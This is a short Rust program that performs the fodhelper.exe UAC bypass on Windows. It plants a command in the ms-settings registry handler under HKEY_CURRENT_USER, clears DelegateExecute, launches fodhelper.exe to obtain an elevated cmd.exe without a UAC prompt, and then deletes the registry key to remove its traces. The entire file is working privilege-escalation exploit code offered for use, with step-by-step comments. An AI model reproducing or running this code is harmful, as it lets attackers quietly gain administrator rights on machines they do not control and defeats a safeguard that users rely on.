use winreg::enums::*;
use winreg::RegKey;
use std::process::Command;

fn main() {
    // Access the HKEY_CURRENT_USER (hkcu) registry
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    // Specify the registry path where modifications will be made
    let path = r"Software\Classes\ms-settings\Shell\Open\command";

    // Create or open the specified registry key and save it in `key`
    // `_disposition` indicates whether the key was created or opened, but is unused here
    let (key, _disposition) = hkcu.create_subkey(&path).unwrap();
    
    // Set registry values necessary for the UAC bypass
    // The empty string value (default) is set to launch cmd.exe with elevated privileges
    key.set_value("", &"cmd /c start cmd.exe").unwrap();
    // `DelegateExecute` is cleared to ensure direct execution without delegation
    key.set_value("DelegateExecute", &"").unwrap();

    // Execute `fodhelper.exe` with elevated privileges via PowerShell
    // This leverages the registry changes made above to bypass UAC
    let ps_command = "Start-Process 'C:\\Windows\\System32\\fodhelper.exe' -Verb RunAs";
    Command::new("powershell")
        .args(&[ps_command])
        .output()
        .expect("Failed to execute fodhelper.exe via PowerShell");

    println!("UAC bypass attempt executed. Please check for elevated cmd.exe window.");

    // Sleep for 5 seconds to ensure that the UAC bypass has time to complete
    println!("Sleeping for 5 seconds to allow UAC bypass to complete...");
    std::thread::sleep(std::time::Duration::from_secs(5));

    // Clean up the registry by removing the keys used for the bypass
    println!("Cleaning up registry changes...");
    if let Err(e) = hkcu.delete_subkey_all(&path) {
        eprintln!("Failed to clean up registry changes: {}", e);
    }
}